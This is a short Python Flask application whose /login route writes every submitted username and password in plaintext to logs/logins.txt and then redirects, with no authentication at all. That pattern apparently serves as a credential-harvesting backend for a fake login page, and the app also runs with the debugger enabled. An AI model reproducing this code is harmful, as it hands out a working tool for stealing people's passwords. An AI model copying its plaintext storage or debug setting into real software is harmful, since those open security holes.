from flask import Flask, request, redirect, url_for, render_template
import os

app = Flask(__name__)

# Ensure the 'logs' directory exists
os.makedirs('logs', exist_ok=True)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']

    # Save the login info to a .txt file
    with open('logs/logins.txt', 'a') as f:
        f.write(f'Username: {username}, Password: {password}\n')

    return redirect(url_for('index'))

if __name__ == '__main__':
    app.run(debug=True)
